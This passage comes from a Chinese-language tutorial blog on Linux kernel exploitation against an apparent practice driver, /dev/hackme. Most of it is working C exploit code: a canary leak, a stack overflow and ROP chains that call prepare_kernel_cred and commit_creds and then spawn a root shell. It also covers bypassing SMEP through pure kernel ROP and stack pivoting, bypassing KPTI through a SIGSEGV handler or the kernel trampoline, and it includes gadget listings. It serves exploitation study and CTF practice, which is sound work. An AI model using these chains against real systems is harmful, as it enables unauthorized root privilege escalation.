class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rdi,rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,rax;&quot;</span>          <span class="comment">//init_task.creds -&gt; rdi</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span>             <span class="comment">//commit_creds(init_task.creds)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">0xA8</span>);</span><br><span class="line">    canary = *(<span class="type">size_t</span>*)((<span class="type">char</span>*)buffer+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h3 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass SMEP"></a>bypass SMEP</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
<p><code>smep</code>类似于用户态的NX的概念,</p>
<p><code>NX</code>不允许用户在堆栈里执行</p>
<p><code>smep</code>不允许内核态执行用户代码 , 内核态只能执行内核态的代码</p>
<p>之前在内核堆栈中构造<code>rop</code>链, 直接返回到用户代码,  会被<code>smep</code>拦住</p>
<p>绕过方式:</p>
<p>1.<code>CR4[bit20]</code>是SMEP开关, 在老版本内核上可以改成0绕过, 但是在新内核上CR4[bit20]被扎了钉子, 手动改成0会立刻被自动改回1</p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20241120211400284.png" alt="image-20241120211400284"></p>
<p>2.全用内核<code>rop</code>绕过</p>
<p>之前的exp失效的原因是, rop链上的返回地址, 是用户程序中的<code>privilege_escalation</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br></pre></td></tr></table></figure>

<p><code>smep</code>要求在进入内核之后, 只能调用内核函数</p>
<p>那么我们需要使用纯rop链代替<code>privilege_escalation</code>的功能</p>
<p>那么这个<code>rop</code>链应该这样构造:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.addr prepare_kernel_cred</span><br><span class="line">2.gadget rax-&gt;rdi</span><br><span class="line">3.addr commit_cred</span><br><span class="line">4.addr swapgs; ret</span><br><span class="line">5.iretq</span><br><span class="line">6.RIP|CS|RFLAGS|SP|SS</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    payload[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    payload[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    payload[offset++] = addr_commit_creds;</span><br><span class="line">    payload[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    payload[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    payload[offset++] = user_rip;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h4><p>在只开启<code>smep</code>, 不开启<code>smap</code>的情况下, 虽然控制流无法直接执行用户空间的程序</p>
<p>但是可以直接访问用户空间的数据</p>
<p>在用户空间上申请一块内存, 然后在rop链上构造堆栈迁移, 将内核堆栈搬到用户空间中, </p>
<p>堆栈迁移的好处是:</p>
<p>1.拥有更大的空间</p>
<p>2.新堆栈可执行</p>
<p>需要注意的是, <code>mmap</code>申请的页必须对齐到<code>0x1000</code></p>
<p>用这个<code>gadget</code>, 实际上这个限制已经非常严苛了, 甚至查<code>rsp</code>的<code>gadget</code>查不到, </p>
<p>查<code>esp</code>还是查到了两条, 幸运的是这两个地址也是在内核代码段里的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov rsp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov esp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff8196f56a</span> : mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81971202</span> : xchg ebx, eax ; mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>在<code>x86_64</code>汇编中,对<code>esp</code>这种<code>32</code>为寄存器的搬运操作, 默认是无符号搬运, 也就是说</p>
<p><code>mov esp, 0x5b000000 </code>只会给<code>esp</code>的低<code>32</code>位置数, 高<code>32</code>位置零</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">alloc_fake_stack</span><span class="params">()</span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="type">char</span>*)fake_stack_addr - <span class="number">0x1000</span>,<span class="number">0x2000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdeadbeef</span>;		<span class="comment">//实际上写东西才会真正创建这个页</span></span><br><span class="line">    </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    fake_stack[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    fake_stack[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    fake_stack[offset++] = addr_commit_creds;</span><br><span class="line">    fake_stack[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    fake_stack[offset++] = user_rip;</span><br><span class="line">    fake_stack[offset++] = user_cs;</span><br><span class="line">    fake_stack[offset++] = user_rflags;</span><br><span class="line">    fake_stack[offset++] = user_sp;</span><br><span class="line">    fake_stack[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,fake_stack,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>0x5b000000 </code>这空间是用户空间的, 因此在开启smap之后, 这种方法会失效</p>
<h3 id="bypass-KPTI"><a href="#bypass-KPTI" class="headerlink" title="bypass KPTI"></a>bypass KPTI</h3><p><code>Kernel page-table isolation</code> , 内核页表隔离</p>
<p>开启kpti保护后, 用户态和内核态分别使用两张页表,</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>在用户态时,页表包含了全部用户空间与内核空间的很小一部分, 主要是系统调用入口</p>
<p>在内核态时,页表包含了全部用户空间与全部内核空间, 但是用户空间的内存映射部分全都被标记为<strong>不可执行</strong>(但是还是可读写的)</p>
<p>涉及到用户态与内核态的转换时, 首先要更换页表</p>
<p>如果在内核态中不更换页表, 直接<code>iret</code>返回到用户空间想起<code>shell</code>会被<code>kpti</code>发现</p>
<h4 id="signal-handler方法"><a href="#signal-handler方法" class="headerlink" title="signal handler方法"></a>signal handler方法</h4><p>虽然不更换页表直接返回到用户态, 会被<code>kpti</code>发现</p>
<p>但是此时内核并不会崩溃,而是报告一个用户态的<code>SIGSEGV</code>信号</p>
<blockquote>
<p>为什么是用户态的段错误信号呢?</p>
<p>因为此时已经<code>iret</code>返回到用户态了</p>
<p>但是页表使用的仍然是<code>kpti</code>内核态页表, 而从这个也表上只能看出当前用户空间代码段没有x权限</p>
<p>因此实际上类似于NX保护时尝试执行堆栈中的<code>shellcode</code>, 是一个道理</p>
<p>因此是用户态的段错误</p>
</blockquote>
<p>调试发现, 当段错误信号发生时, 已经完成了<code>cred</code>的更换, 并且已经<code>iret</code>返回到了用户态</p>
<p>在用户态刚要执行的第一条代码触发了中断, 内核给用户发送了<code>SIGSEGV</code></p>
<p>如果此前用户已经注册了信号处理函数, <code>shell</code>作为<code>SIGSEGV</code>的处理函数, 内核会通过正常的中断处理程序返回到用户态, 内核自己正常返回时会自动切换页表, 因此经过这条路返回到用户态就正常了, 并且控制流也给到了shell函数中</p>
<p>就可以起一个<code>root shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="kpti-trampoline方法"><a href="#kpti-trampoline方法" class="headerlink" title="kpti trampoline方法"></a>kpti trampoline方法</h4><p>基于这样一点考虑:</p>
<p>内核正常的系统调用如果能走某条路成功着陆用户态,那么<strong>我们也可以借道</strong></p>
<p>这个道就叫<code>kpti trampoline</code>, 这道可以 <code>更换页表, swapgs, iretq</code></p>
<blockquote>
<p>trampoline是指内核态返回到用户态的缓冲, 因此叫做蹦床</p>
</blockquote>
<p>位于内核函数<code>	swapgs_restore_regs_and_return_to_usermode </code>中</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ Linux-5.14/arch/x86/entry/entry_64.S</span></span><br><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line">	<span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">	testb	$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">	jnz	<span class="number">1f</span></span><br><span class="line">	ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">	pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* SS */</span></span><br><span class="line">	pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* EFLAGS */</span></span><br><span class="line">	pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* CS */</span></span><br><span class="line">	pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">	pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Restore RDI. */</span></span><br><span class="line">	popq	%rdi</span><br><span class="line">	SWAPGS</span><br><span class="line">	INTERRUPT_RETURN</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>标号1这部分是正文</p>
<p>在这部分中,首先<code>POP_REGS pop_rdi=0</code>这是个宏, 它会从栈上弹出一系列值交给寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//@Linux5.14/arch/x86/entry/calling.h</span><br><span class="line">.macro POP_REGS pop_rdi=1 skip_r11rcx=0</span><br><span class="line">	popq %r15</span><br><span class="line">	popq %r14</span><br><span class="line">	popq %r13</span><br><span class="line">	popq %r12</span><br><span class="line">	popq %rbp</span><br><span class="line">	popq %rbx</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %r11</span><br><span class="line">	.endif</span><br><span class="line">	popq %r10</span><br><span class="line">	popq %r9</span><br><span class="line">	popq %r8</span><br><span class="line">	popq %rax</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %rcx</span><br><span class="line">	.endif</span><br><span class="line">	popq %rdx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.if \pop_rdi</span><br><span class="line">	popq %rdi</span><br><span class="line">	.endif</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>

<p>接下来rdi指向旧堆栈, 从gs段拿出rsp0交给rsp</p>
<p>然后把老堆栈上保存的用户上下文压到新堆栈里</p>
<p>然后更换页表</p>
<p>然后swapgs</p>
<p>然后iret</p>
<p>实际上此时iret使用的堆栈, 已经是新堆栈了,不是老堆栈</p>
</blockquote>
<p>具体干了啥可以看反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#POP_REGS部分省略</span><br><span class="line"></span><br><span class="line">  0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</span><br><span class="line">  0xffffffff81200f29 &lt;_stext+2101033&gt;: mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">  0xffffffff81200f32 &lt;_stext+2101042&gt;: push   QWORD PTR [rdi+0x30]		;用户ss</span><br><span class="line">  0xffffffff81200f35 &lt;_stext+2101045&gt;: push   QWORD PTR [rdi+0x28]		;用户rsp</span><br><span class="line">  0xffffffff81200f38 &lt;_stext+2101048&gt;: push   QWORD PTR [rdi+0x20]		;用户eflags</span><br><span class="line">  0xffffffff81200f3b &lt;_stext+2101051&gt;: push   QWORD PTR [rdi+0x18]		;用户cs</span><br><span class="line">  0xffffffff81200f3e &lt;_stext+2101054&gt;: push   QWORD PTR [rdi+0x10]		;用户rip</span><br><span class="line">  0xffffffff81200f41 &lt;_stext+2101057&gt;: push   QWORD PTR [rdi]			;老栈顶</span><br><span class="line">  0xffffffff81200f43 &lt;_stext+2101059&gt;: push   rax</span><br><span class="line">  0xffffffff81200f44 &lt;_stext+2101060&gt;: xchg   ax,ax</span><br><span class="line">  0xffffffff81200f46 &lt;_stext+2101062&gt;: mov    rdi,cr3</span><br><span class="line">  0xffffffff81200f49 &lt;_stext+2101065&gt;: jmp    0xffffffff81200f7f &lt;_stext+2101119&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200f7f &lt;_stext+2101119&gt;: or     rdi,0x1000			#蜜汁操作</span><br><span class="line">  0xffffffff81200f86 &lt;_stext+2101126&gt;: mov    cr3,rdi</span><br><span class="line">  0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">  0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br><span class="line">  0xffffffff81200f8b &lt;_stext+2101131&gt;: swapgs</span><br><span class="line">  0xffffffff81200f8e &lt;_stext+2101134&gt;: nop    DWORD PTR [rax]</span><br><span class="line">  0xffffffff81200f91 &lt;_stext+2101137&gt;: jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200fc0 &lt;_stext+2101184&gt;: test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">  0xffffffff81200fc5 &lt;_stext+2101189&gt;: jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;	#这个调试观察不会跳</span><br><span class="line">  0xffffffff81200fc7 &lt;_stext+2101191&gt;: iretq</span><br></pre></td></tr></table></figure>

<p>这里有一个很迷的操作, 把<code>cr3</code>里面的页表地址拿出来, 或了一个<code>0x1000</code>再放回去, 就完成了内核态-用户态页表的更换, 这是因为这俩页表地址还真就是这样挨着存放的, 这哥俩被称为一个<code>CR3 Pair</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/a99b0d0eef40d94aa386ee0d903b5a64.png" alt="CR3 Pair"></p>
<blockquote>
<p>这种伙伴形式还见于完全二叉树:</p>
<p>如果根从1开始编号, 那么其他节点的编号异或1就是其兄弟节点</p>
</blockquote>
<p>如果构造ROP链, 返回到<code>    0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</code>这一行</p>
<p>下面还要填充两个dummy来满足这两个pop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br></pre></td></tr></table></figure>



<h3 id="bypass-SMAP"><a href="#bypass-SMAP" class="headerlink" title="bypass SMAP"></a>bypass SMAP</h3><p>smap意味着内核态无法访问用户态任何数据</p>
<p>象内核栈迁移到用户态映射区就白搭了</p>
<p>但是纯用rop链还是可以的</p>
<h3 id="bypass-KASLR"><a href="#bypass-KASLR" class="headerlink" title="bypass KASLR"></a>bypass KASLR</h3><p><code>FG-KASLR</code>,不光整个内核镜像基地址随机, 部分函数之间的相对偏移量也会变, 真是死🐎了</p>
